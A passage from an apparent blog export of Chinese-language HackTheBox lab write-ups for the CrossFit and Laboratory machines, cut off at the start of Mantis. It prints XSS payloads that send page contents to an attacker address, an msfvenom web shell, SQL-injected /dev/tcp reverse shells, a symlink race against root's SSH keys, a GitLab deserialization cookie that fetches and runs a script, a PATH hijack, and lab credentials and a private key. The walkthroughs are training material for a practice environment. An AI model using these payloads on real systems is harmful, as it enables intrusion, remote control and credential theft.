HackTheBox","slug":"CrossFit-HackTheBox","date":"2020-12-02T02:44:23.000Z","updated":"2021-03-22T00:57:40.771Z","comments":true,"path":"2020/12/02/CrossFit-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/12/02/CrossFit-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/277 10.10.10.208 端口扫描21,22和80: 1234567891011121314151617181920212223$ nmap -sC -sV 10.10.10.208Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-01 14:59 CSTNmap scan report for 10.10.10.208Host is up (0.074s latency).Not shown: 997 closed portsPORT STATE SERVICE VERSION21/tcp open ftp vsftpd 2.0.8 or later| ssl-cert: Subject: commonName=*.crossfit.htb/organizationName=Cross Fit Ltd./stateOrProvinceName=NY/countryName=US| Not valid before: 2020-04-30T19:16:46|_Not valid after: 3991-08-16T19:16:46|_ssl-date: TLS randomness does not represent time22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey:| 2048 b0:e7:5f:5f:7e:5a:4f:e8:e4:cf:f1:98:01:cb:3f:52 (RSA)| 256 67:88:2d:20:a5:c1:a7:71:50:2b:c8:07:a4:b2:60:e5 (ECDSA)|_ 256 62:ce:a3:15:93:c8:8c:b6:8e:23:1d:66:52:f4:4f:ef (ED25519)80/tcp open http Apache httpd 2.4.38 ((Debian))|_http-server-header: Apache/2.4.38 (Debian)|_http-title: Apache2 Debian Default Page: It worksService Info: Host: Cross; OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 31.39 seconds 80apache默认页面： 2121配置了ssl，检查证书能够得到子域名和一个邮箱： 1234openssl s_client -connect 10.10.10.208:21 -starttls ftpinfo@gym-club.crossfit.htbgym-club.crossfit.htb 配置hosts： 110.10.10.208 crossfit.htb gym-club.crossfit.htb gym-club.crossfit.htb是一个健身房网站： 并且存在XSS检测： XSS 注意XSS检测提示信息： A security report containing your IP address and browser information will be generated and our admin team will be immediately notified. 浏览器信息之类的会发给管理员查看，那么如果在UA里进行XSS让管理员查看呢，因为靶机环境不能用外部XSS平台，就用beef吧： 1&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;10.10.14.12:3000&#x2F;hook.js&quot;&gt;&lt;&#x2F;script&gt; 注意发送的message需要有xss payload才能触发管理员去访问查看UA，然后XSS上线： CORSftp.crossfit.htb(这个域名怎么来的，不知道，wp里都说是别人给的提示,或者根据21端口ftp猜域名？)（ 补充：根据参考资料里是header里&quot;Origin: http://$FUZZ.$DOMAIN&quot;可以fuzz出来哪些有效）这个配置了CORS，就是一步步获取网页结构，参数格式之类的。可以创建新的ftp账号，但有token，beef不行，需要自定义xss代码： ftp.crossfit.htb第一次请求到token，第二次发送创建账号的request的时候，token就过期了，得自己写一个, 添加ftp账号： 解码内容表明添加账号成功： adduser.js注意正则那里，直接用的参考资料里的脚本，少个/,自己加上 123456789101112131415161718192021222324myhttpserver = 'http://10.10.14.12:3000/'targeturl = 'http://ftp.crossfit.htb/accounts/create'req = new XMLHttpRequest;req.onreadystatechange = function() &#123; if (req.readyState == 4) &#123; req2 = new XMLHttpRequest; req2.open('GET', myhttpserver + btoa(this.responseText),false); req2.send(); &#125;&#125;req.withCredentials = true; //这个是必须的，不然无法关联 /accounts/create 和 /accounts的连续两次请求req.open('GET', targeturl, false);req.send();reg = /\"_token\" value=\"(.*)\"/g;token = reg.exec(req.responseText)[1];var formData = new FormData();formData.append(\"username\", \"miao\");formData.append(\"pass\", \"miao123456\");formData.append(\"_token\",token);req.open('POST', 'http://ftp.crossfit.htb/accounts', true);req.send(formData); FTP因为ftp用了ssl，需要用支持的客户端连接,得到一个新的development，(ls就可能会有证书错误，自己改下.lftprc): .lftprc1234567set ftp:ssl-auth TLSset ftp:ssl-force trueset ftp:ssl-allow yesset ftp:ssl-protect-list yesset ftp:ssl-protect-data yesset ftp:ssl-protect-fxp yesset ssl:verify-certificate no reverse shell然后就是通过FTP写shell，然后XSS CORS去访问新的子域名development-test.crossfit.htb触发webshell： 1234msfvenom -p php/meterpreter_reverse_tcp LHOST=\"10.10.14.12\" LPORT=4444 -f raw &gt; miao.php# 这一步也可以自己编辑，去掉开头的注释cat miao.php | pbcopy &amp;&amp; echo '&lt;?php ' | tr -d '\\n' &gt; miao.php &amp;&amp; pbpaste &gt;&gt; miao.php FTP传shell： 触发shell： shell.js12345678910111213myhttpserver = 'http://10.10.14.12:3000/'targeturl = 'http://development-test.crossfit.htb/miao.php'req = new XMLHttpRequest;req.onreadystatechange = function() &#123; if (req.readyState == 4) &#123; req2 = new XMLHttpRequest; req2.open('GET', myhttpserver + btoa(this.responseText),false); req2.send(); &#125;&#125;req.open('GET', targeturl, false);req.send(); 用户信息简单的枚举能够发现/etc/ansible/playbooks/adduser_hank.yml文件，里面有个hash： 破解出来hank用户密码： 123sudo john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt hash.txtpowerpuffgirls (?) adduser_hank.yml1234567891011121314---- name: Add new user to all systems connection: network_cli gather_facts: false hosts: all tasks: - name: Add the user 'hank' with default password and make it a member of the 'admins' group user: name: hank shell: /bin/bash password: $6$e20D6nUeTJOIyRio$A777Jj8tk5.sfACzLuIqqfZOCsKTVCfNEQIbH79nZf09mM.Iov/pzDCE8xNZZCM9MuHKMcjqNUd8QUEzC1CZG/ groups: admins append: yes user flag用得到的密码ssh登录hank，用户目录得到user.txt: 提权信息在crontab里看到有定时任务，每分钟以isaac用户权限执行/usr/bin/php /home/isaac/send_updates/send_updates.php 查看php发现用到use mikehaertl\\shellcommand\\Command,版本号在composer.json里是1.6.0，搜索发现相关漏洞： Command Injection in mikehaertl/php-shellcommand | Snykhttps://snyk.io/vuln/SNYK-PHP-MIKEHAERTLPHPSHELLCOMMAND-538426 /etc/crontab123456789101112131415161718192021222324# &#x2F;etc&#x2F;crontab: system-wide crontab# Unlike any other crontab you don&#39;t have to run the &#96;crontab&#39;# command to install the new version when you edit this file# and files in &#x2F;etc&#x2F;cron.d. These files also have username fields,# that none of the other crontabs do.MAILTO&#x3D;&quot;&quot;SHELL&#x3D;&#x2F;bin&#x2F;shPATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin# Example of job definition:# .---------------- minute (0 - 59)# | .------------- hour (0 - 23)# | | .---------- day of month (1 - 31)# | | | .------- month (1 - 12) OR jan,feb,mar,apr ...# | | | | .---- day of week (0 - 6) (Sunday&#x3D;0 or 7) OR sun,mon,tue,wed,thu,fri,sat# | | | | |# * * * * * user-name command to be executed17 * * * * root cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.hourly25 6 * * * root test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.daily )47 6 * * 7 root test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.weekly )52 6 1 * * root test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.monthly )* * * * * isaac &#x2F;usr&#x2F;bin&#x2F;php &#x2F;home&#x2F;isaac&#x2F;send_updates&#x2F;send_updates.php# /home/isaac/send_updates/send_updates.php12345678910111213141516171819202122232425262728293031323334353637&lt;?php/*************************************************** * Send email updates to users in the mailing list * ***************************************************/require(\"vendor/autoload.php\");require(\"includes/functions.php\");require(\"includes/db.php\");require(\"includes/config.php\");use mikehaertl\\shellcommand\\Command;if($conn)&#123; $fs_iterator = new FilesystemIterator($msg_dir); foreach ($fs_iterator as $file_info) &#123; if($file_info-&gt;isFile()) &#123; $full_path = $file_info-&gt;getPathname(); $res = $conn-&gt;query('SELECT email FROM users'); while($row = $res-&gt;fetch_array(MYSQLI_ASSOC)) &#123; $command = new Command('/usr/bin/mail'); $command-&gt;addArg('-s', 'CrossFit Club Newsletter', $escape=true); $command-&gt;addArg($row['email'], $escape=true); $msg = file_get_contents($full_path); $command-&gt;setStdIn('test'); $command-&gt;execute(); &#125; &#125; unlink($full_path); &#125;&#125;cleanup();?&gt; /home/isaac/send_updates/composer.json12345&#123; \"require\": &#123; \"mikehaertl/php-shellcommand\": \"1.6.0\" &#125;&#125; /var/www/gym-club/db.php1234567&lt;?php$dbhost = \"localhost\";$dbuser = \"crossfit\";$dbpass = \"oeLoo~y2baeni\";$db = \"crossfit\";$conn = new mysqli($dbhost, $dbuser, $dbpass, $db);?&gt; /etc/pam.d/vsftpd12345678910111213auth sufficient pam_mysql.so user&#x3D;ftpadm passwd&#x3D;8W)&#125;gpRJvAmnb host&#x3D;localhost db&#x3D;ftphosting table&#x3D;accounts usercolumn&#x3D;username passwdcolumn&#x3D;pass crypt&#x3D;3account sufficient pam_mysql.so user&#x3D;ftpadm passwd&#x3D;8W)&#125;gpRJvAmnb host&#x3D;localhost db&#x3D;ftphosting table&#x3D;accounts usercolumn&#x3D;username passwdcolumn&#x3D;pass crypt&#x3D;3# Standard behaviour for ftpd(8).auth required pam_listfile.so item&#x3D;user sense&#x3D;deny file&#x3D;&#x2F;etc&#x2F;ftpusers onerr&#x3D;succeed# Note: vsftpd handles anonymous logins on its own. Do not enable pam_ftp.so.# Standard pam includes@include common-account@include common-session@include common-authauth required pam_shells.so 命令注入结合代码，触发方式需要我们用ftpadm登录写入文件，然后把数据库里写入恶意命令等待执行触发： 可以看到命令执行成功，修改下命令即可得到isaac用户shell： commands1234mysql -h localhost -u crossfit -poeLoo~y2baeni -Dcrossfitinsert into users (email) values (&quot;test | curl 10.10.14.12:3000&#x2F;&#96;whoami&#96;&quot;);insert into users (email) values (&quot;test | bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.12&#x2F;4445 0&gt;&amp;1&#39;&quot;);insert into users (email) values (&quot;-E $(bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.12&#x2F;4445 0&gt;&amp;1&#39;)&quot;); /usr/bin/dbmsg跑下pspy64之类的能够发现这个在定时跑，下载下来分析： process_data 大概流程就是从mysql里获取数据，写到/var/local/ 下面，文件名生成就是用当前时间作为种子，生成随机数，然后在后面加上1(注意看snprintf(local_c8,0x30,&quot;%d%s&quot;,(ulong)uVar2,lVar3);, Var3来自于local_38，local_3是mysql_fetch_row的返回值)，然后再求md5值，作为文件名。这里存在一个漏洞，因为文件名在特定的时间是确定的，如果我去把相应的文件名作为软链接到其他文件上，那是不是就可以覆盖其他文件内容了？ 条件竞争 测试环节略过，实际就是直接写公钥,自己编译随机数程序： 1ssh-keygen -t ed25519 -f id_rsa 随机数程序123456789101112#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;time.h&gt;int main(void)&#123; char tmp[50]; srand(time(0)); snprintf(tmp, 50, \"%d%s\", rand(), \"1\"); printf(\"%s\\n\",tmp); return 0;&#125; sql &amp; 竞争12345mysql -h localhost -u crossfit -poeLoo~y2baeni -Dcrossfit -e'insert into messages (id, name, email,message) values (1, \"test\",\"test@test.com\",\"thisisatestmessage\");'while true; do ln -s /tmp/test /var/local/$(echo -n $(./test) | md5sum | cut -d \" \" -f 1) 2&gt;/dev/null; donemysql -h localhost -u crossfit -poeLoo~y2baeni -Dcrossfit -e'insert into messages (id, name, email,message) values (1, \"ssh-ed25519\",\"miao@miao\",\"AAAAC3NzaC1lZDI1NTE5AAAAIGxxGiUiObPWiHCxE/xTCAlHSkGC0qiOtrxUYNar8I6I\");'while true; do ln -s /root/.ssh/authorized_keys /var/local/$(echo -n $(./test) | md5sum | cut -d \" \" -f 1) 2&gt;/dev/null; done root flag然后等待竞争成功，root登录，得到root.txt: 参考资料 https://github.com/beefproject/beef https://anonymousfiles.io/f/crossfit-ByNav1n.pdf [HTB] Crossfit · 5p4d37’s Bloghttps://d.oulove.me/2020/11/23/HTB-Crossfit/ CrossFit: Hack The Box Walkthroughhttps://hackso.me/crossfit-htb-walkthrough/ HackTheBox - Crossfit - YouTubehttps://www.youtube.com/watch?v=Z3Lj_YN0crc&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Laboratory - HackTheBox","slug":"Laboratory-HackTheBox","date":"2020-11-23T07:44:17.000Z","updated":"2021-04-19T00:49:14.532Z","comments":true,"path":"2020/11/23/Laboratory-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/11/23/Laboratory-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/298 10.10.10.216 端口扫描常规的22，80，443，ssl证书里得到子域名，加hosts： 110.10.10.216 laboratory.htb git.laboratory.htb 扫描结果： 123456789101112131415161718192021222324252627$ nmap -sC -sV 10.10.10.216Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-23 13:55 CSTNmap scan report for 10.10.10.216Host is up (0.069s latency).Not shown: 997 filtered portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 25:ba:64:8f:79:9d:5d:95:97:2c:1b:b2:5e:9b:55:0d (RSA)| 256 28:00:89:05:55:f9:a2:ea:3c:7d:70:ea:4d:ea:60:0f (ECDSA)|_ 256 77:20:ff:e9:46:c0:68:92:1a:0b:21:29:d1:53:aa:87 (ED25519)80/tcp open http Apache httpd 2.4.41|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Did not follow redirect to https://laboratory.htb/443/tcp open ssl/http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: The Laboratory| ssl-cert: Subject: commonName=laboratory.htb| Subject Alternative Name: DNS:git.laboratory.htb| Not valid before: 2020-07-05T10:39:28|_Not valid after: 2024-03-03T10:39:28| tls-alpn:|_ http/1.1Service Info: Host: laboratory.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 62.73 seconds laboratory.htb访问ip会直接跳到https://laboratory.htb/ 一个普通的网页，有一些用户信息： 123DexterDee DeeAnonymous git.laboratory.htb是一个gitlab： 注册邮箱有限制，需要是XXX@laboratory.htb: gitlab vuln 在help页面得到gitlab版本是12.8.1: CVE-2020-10977搜索得到相关漏洞，CVE-2020-10977: Arbitrary file read via the UploadsRewriter when moving an issue (#212175) · Issues · GitLab.org / GitLab · GitLabhttps://gitlab.com/gitlab-org/gitlab/-/issues/212175 thewhiteh4t/cve-2020-10977: GitLab 12.9.0 Arbitrary File Readhttps://github.com/thewhiteh4t/cve-2020-10977 可以根据gitlab的issue一步步来，也可以exp直接打，任意文件读取： secrets.yml根据gitlab上的描述，我们需要secrets.yml来远程连接server： 路径：/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061# This file is managed by gitlab-ctl. Manual changes will be# erased! To change the contents below, edit &#x2F;etc&#x2F;gitlab&#x2F;gitlab.rb# and run &#96;sudo gitlab-ctl reconfigure&#96;.---production: db_key_base: 627773a77f567a5853a5c6652018f3f6e41d04aa53ed1e0df33c66b04ef0c38b88f402e0e73ba7676e93f1e54e425f74d59528fb35b170a1b9d5ce620bc11838 secret_key_base: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3 otp_key_base: db3432d6fa4c43e68bf7024f3c92fea4eeea1f6be1e6ebd6bb6e40e930f0933068810311dc9f0ec78196faa69e0aac01171d62f4e225d61e0b84263903fd06af openid_connect_signing_key: | -----BEGIN RSA PRIVATE KEY----- MIIJKQIBAAKCAgEA5LQnENotwu&#x2F;SUAshZ9vacrnVeYXrYPJoxkaRc2Q3JpbRcZTu YxMJm2+5ZDzaDu5T4xLbcM0BshgOM8N3gMcogz0KUmMD3OGLt90vNBq8Wo&#x2F;9cSyV RnBSnbCl0EzpFeeMBymR8aBm8sRpy7+n9VRawmjX9os25CmBBJB93NnZj8QFJxPt u00f71w1pOL+CIEPAgSSZazwI5kfeU9wCvy0Q650ml6nC7lAbiinqQnocvCGbV0O aDFmO98dwdJ3wnMTkPAwvJcESa7iRFMSuelgst4xt4a1js1esTvvVHO&#x2F;fQfHdYo3 5Y8r9yYeCarBYkFiqPMec8lhrfmviwcTMyK&#x2F;TBRAkj9wKKXZmm8xyNcEzP5psRAM e4RO91xrgQx7ETcBuJm3xnfGxPWvqXjvbl72UNvU9ZXuw6zGaS7fxqf8Oi9u8R4r T&#x2F;5ABWZ1CSucfIySfJJzCK&#x2F;pUJzRNnjsEgTc0HHmyn0wwSuDp3w8EjLJIl4vWg1Z vSCEPzBJXnNqJvIGuWu3kHXONnTq&#x2F;fHOjgs3cfo0i&#x2F;eS&#x2F;9PUMz4R3JO+kccIz4Zx NFvKwlJZH&#x2F;4ldRNyvI32yqhfMUUKVsNGm+7CnJNHm8wG3CMS5Z5+ajIksgEZBW8S JosryuUVF3pShOIM+80p5JHdLhJOzsWMwap57AWyBia6erE40DS0e0BrpdsCAwEA AQKCAgB5Cxg6BR9&#x2F;Muq+zoVJsMS3P7&#x2F;KZ6SiVOo7NpI43muKEvya&#x2F;tYEvcix6bnX YZWPnXfskMhvtTEWj0DFCMkw8Tdx7laOMDWVLBKEp54aF6Rk0hyzT4NaGoy&#x2F;RQUd b&#x2F;dVTo2AJPJHTjvudSIBYliEsbavekoDBL9ylrzgK5FR2EMbogWQHy4Nmc4zIzyJ HlKRMa09ximtgpA+ZwaPcAm+5uyJfcXdBgenXs7I&#x2F;t9tyf6rBr4&#x2F;F6dOYgbX3Uik kr4rvjg218kTp2HvlY3P15&#x2F;roac6Q&#x2F;tQRQ3GnM9nQm9y5SgOBpX8kcDv0IzWa+gt +aAMXsrW3IXbhlQafjH4hTAWOme&#x2F;3gz87piKeSH61BVyW1sFUcuryKqoWPjjqhvA hsNiM9AOXumQNNQvVVijJOQuftsSRCLkiik5rC3rv9XvhpJVQoi95ouoBU7aLfI8 MIkuT+VrXbE7YYEmIaCxoI4+oFx8TPbTTDfbwgW9uETse8S&#x2F;lOnDwUvb+xenEOku r68Bc5Sz21kVb9zGQVD4SrES1+UPCY0zxAwXRur6RfH6np&#x2F;9gOj7ATUKpNk&#x2F;583k Mc3Gefh+wyhmalDDfaTVJ59A7uQFS8FYoXAmGy&#x2F;jPY&#x2F;uhGr8BinthxX6UcaWyydX sg2l6K26XD6pAObLVYsXbQGpJa2gKtIhcbMaUHdi2xekLORygQKCAQEA+5XMR3nk psDUlINOXRbd4nKCTMUeG00BPQJ80xfuQrAmdXgTnhfe0PlhCb88jt8ut+sx3N0a 0ZHaktzuYZcHeDiulqp4If3OD&#x2F;JKIfOH88iGJFAnjYCbjqbRP5+StBybdB98pN3W Lo4msLsyn2&#x2F;kIZKCinSFAydcyIH7l+FmPA0dTocnX7nqQHJ3C9GvEaECZdjrc7KT fbC7TSFwOQbKwwr0PFAbOBh83MId0O2DNu5mTHMeZdz2JXSELEcm1ywXRSrBA9+q wjGP2QpuXxEUBWLbjsXeG5kesbYT0xcZ9RbZRLQOz&#x2F;JixW6P4&#x2F;lg8XD&#x2F;SxVhH5T+ k9WFppd3NBWa4QKCAQEA6LeQWE+XXnbYUdwdveTG99LFOBvbUwEwa9jTjaiQrcYf Uspt0zNCehcCFj5TTENZWi5HtT9j8QoxiwnNTcbfdQ2a2YEAW4G8jNA5yNWWIhzK wkyOe22+Uctenc6yA9Z5+TlNJL9w4tIqzBqWvV00L+D1e6pUAYa7DGRE3x+WSIz1 UHoEjo6XeHr+s36936c947YWYyNH3o7NPPigTwIGNy3f8BoDltU8DH45jCHJVF57 &#x2F;NKluuuU5ZJ3SinzQNpJfsZlh4nYEIV5ZMZOIReZbaq2GSGoVwEBxabR&#x2F;KiqAwCX wBZDWKw4dJR0nEeQb2qCxW30IiPnwVNiRcQZ2KN0OwKCAQAHBmnL3SV7WosVEo2P n+HWPuhQiHiMvpu4PmeJ5XMrvYt1YEL7+SKppy0EfqiMPMMrM5AS4MGs9GusCitF 4le9DagiYOQ13sZwP42+YPR85C6KuQpBs0OkuhfBtQz9pobYuUBbwi4G4sVFzhRd y1wNa+&#x2F;lOde0&#x2F;NZkauzBkvOt3Zfh53g7&#x2F;g8Cea&#x2F;FTreawGo2udXpRyVDLzorrzFZ Bk2HILktLfd0m4pxB6KZgOhXElUc8WH56i+dYCGIsvvsqjiEH+t&#x2F;1jEIdyXTI61t TibG97m1xOSs1Ju8zp7DGDQLWfX7KyP2vofvh2TRMtd4JnWafSBXJ2vsaNvwiO41 MB1BAoIBAQCTMWfPM6heS3VPcZYuQcHHhjzP3G7A9YOW8zH76553C1VMnFUSvN1T M7JSN2GgXwjpDVS1wz6HexcTBkQg6aT0+IH1CK8dMdX8isfBy7aGJQfqFVoZn7Q9 MBDMZ6wY2VOU2zV8BMp17NC9ACRP6d&#x2F;UWMlsSrOPs5QjplgZeHUptl6DZGn1cSNF RSZMieG20KVInidS1UHj9xbBddCPqIwd4po913ZltMGidUQY6lXZU1nA88t3iwJG onlpI1eEsYzC7uHQ9NMAwCukHfnU3IRi5RMAmlVLkot4ZKd004mVFI7nJC28rFGZ Cz0mi+1DS28jSQSdg3BWy1LhJcPjTp95AoIBAQDpGZ6iLm8lbAR+O8IB2om4CLnV oBiqY1buWZl2H03dTgyyMAaePL8R0MHZ90GxWWu38aPvfVEk24OEPbLCE4DxlVUr 0VyaudN5R6gsRigArHb9iCpOjF3qPW7FaKSpevoCpRLVcAwh3EILOggdGenXTP1k huZSO2K3uFescY74aMcP0qHlLn6sxVFKoNotuPvq5tIvIWlgpHJIysR9bMkOpbhx UR3u0Ca0Ccm0n2AK+92GBF&#x2F;4Z2rZ6MgedYsQrB6Vn8sdFDyWwMYjQ8dlrow&#x2F;XO22 z&#x2F;ulFMTrMITYU5lGDnJ&#x2F;eyiySKslIiqgVEgQaFt9b0U3Nt0XZeCobSH1ltgN -----END RSA PRIVATE KEY----- secret_key_base需要用到的是secret_key_base： 1secret_key_base: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3 gitlab rce首先准备一个同版本的gitlab，可以直接用docker： 1sudo docker pull gitlab/gitlab-ee:12.8.1-ee.0 然后进入gitlab docker内部： 1docker run -it gitlab/gitlab-ee:12.8.1-ee.0 sh 然后启动,可能有一些报错，无视即可： 1/opt/gitlab/embedded/bin/runsvdir-start &amp; 然后 ，重新配置(这一步要等几分钟)： 1gitlab-ctl reconfigure 重新配置之后, 去修改secrets.yml,将其中的secret_key_base修改为我们前面得到的： 1nano /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml 然后启动concole, 运行command,docker里运行会有超时失败不用管，我们需要的是最后生成的cookie： 1gitlab-rails console reverse shell使用curl携带生成的cookie去触发reverse shell： 1curl -k -vvv 'https://git.laboratory.htb/users/sign_in' -b \"experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiAZgjY29kaW5nOlVURi04Cl9lcmJvdXQgPSArJyc7IF9lcmJvdXQuPDwoKCBgY3VybCAxMC4xMC4xNC43Ojk5OTkvbWlhby5zaCAtbyAvdG1wL21pYW8uc2ggJiYgY2htb2QgNzc3IC90bXAvbWlhby5zaCAmJiBiYXNoIC90bXAvbWlhby5zaGAgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uAAY7ClQ=--f5631f3d55cd073a34892d7b9e0d81eb15556432\" command1234567request = ActionDispatch::Request.new(Rails.application.env_config)request.env[\"action_dispatch.cookies_serializer\"] = :marshalcookies = request.cookie_jarerb = ERB.new(\"&lt;%= `curl 10.10.14.7:9999/miao.sh -o /tmp/miao.sh &amp;&amp; chmod 777 /tmp/miao.sh &amp;&amp; bash /tmp/miao.sh` %&gt;\")depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, \"@result\", ActiveSupport::Deprecation.new)cookies.signed[:cookie] = deprputs cookies[:cookie] miao.sh12#!&#x2F;bin&#x2F;bash bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.7&#x2F;4445 0&gt;&amp;1 cookie1BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiAZgjY29kaW5nOlVURi04Cl9lcmJvdXQgPSArJyc7IF9lcmJvdXQuPDwoKCBgY3VybCAxMC4xMC4xNC43Ojk5OTkvbWlhby5zaCAtbyAvdG1wL21pYW8uc2ggJiYgY2htb2QgNzc3IC90bXAvbWlhby5zaCAmJiBiYXNoIC90bXAvbWlhby5zaGAgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uAAY7ClQ&#x3D;--f5631f3d55cd073a34892d7b9e0d81eb15556432 gitlab现在我们拿到了git权限shell，server上也有gitlab，我们就可以用console来进行一些操作： 12python3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;sh&quot;)&#39;gitlab-rails console reset password How to reset your root password | GitLabhttps://docs.gitlab.com/12.10/ee/security/reset_root_password.html 我们可以看到有一个dexter用户，并且在前面的网页上显示他是CEO，那么就修改他的密码： 12345u &#x3D; User.where(id:1).firstu.password &#x3D; &#39;miao@12345&#39;u.password_confirmation &#x3D; &#39;miao@12345&#39;u.save!exit 然后就可以以dexter用户登录gitlab dexter在他的项目里得到ssh私钥： user flag然后直接用这个私钥登录dexter用户，得到user.txt: 提权信息传linpeas和pspy64上去： 12wget http://10.10.14.7:9999/linpeas.shwget http://10.10.14.7:9999/pspy64 Linpeas发现一个suid文件： 12dexter@laboratory:/tmp$ ls -al /usr/local/bin/docker-security-rwsr-xr-x 1 root dexter 16720 Aug 28 14:52 /usr/local/bin/docker-security 尝试运行这个程序，pspy64监测到调用链： 123452020/11/23 07:32:59 CMD: UID=0 PID=330709 | /usr/local/bin/docker-security2020/11/23 07:32:59 CMD: UID=0 PID=330710 | /usr/local/bin/docker-security2020/11/23 07:32:59 CMD: UID=0 PID=330711 | chmod 700 /usr/bin/docker2020/11/23 07:32:59 CMD: UID=0 PID=330712 | /usr/local/bin/docker-security2020/11/23 07:32:59 CMD: UID=??? PID=330713 | ??? 可以看到它调用了chmod，没有指定绝对路径，那么我们就可以进行环境变量PATH劫持 提权准备一个chmod文件写入命令，修改环境变量，运行docker-security： 1234cd /tmpnano chmodchmod +x ./chmodPATH=$(pwd):$PATH docker-security chmod12#!&#x2F;bin&#x2F;bash bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.7&#x2F;4445 0&gt;&amp;1 root flag直接去读取root.txt 参考资料 Arbitrary file read via the UploadsRewriter when moving an issue (#212175) · Issues · GitLab.org / GitLab · GitLabhttps://gitlab.com/gitlab-org/gitlab/-/issues/212175 thewhiteh4t/cve-2020-10977: GitLab 12.9.0 Arbitrary File Readhttps://github.com/thewhiteh4t/cve-2020-10977 How to reset your root password | GitLabhttps://docs.gitlab.com/12.10/ee/security/reset_root_password.html Hackthebox Laboratory writeup | 0xDedinfosechttps://0xdedinfosec.github.io/posts/htb-laboratory/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Mantis - HackTheBox","slug":"Mantis-HackTheBox","date":"2020-11-18T06:38:45.000Z","updated":"2020-11-18T06:39:36.072Z","comments":true,"path":"2020/11/18/Mantis-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/11/18/Mantis-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/98 10.10.10.52 端口扫描需要全端口扫描，用到的1337端口默认扫不到： 1234567891011121314151617181920212223242526272829303132333435$ nmap -p- 10.10.10.52Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-18 13:39 CSTNmap scan report for 10.10.10.52Host is up (0.067s latency).Not shown: 65508 closed portsPORT STATE SERVICE53/tcp open domain88/tcp open kerberos-sec135/tcp open msrpc139/tcp open netbios-ssn389/tcp open ldap445/tcp open microsoft-ds464/tcp open kpasswd5593/tcp open http-rpc-epmap636/tcp open 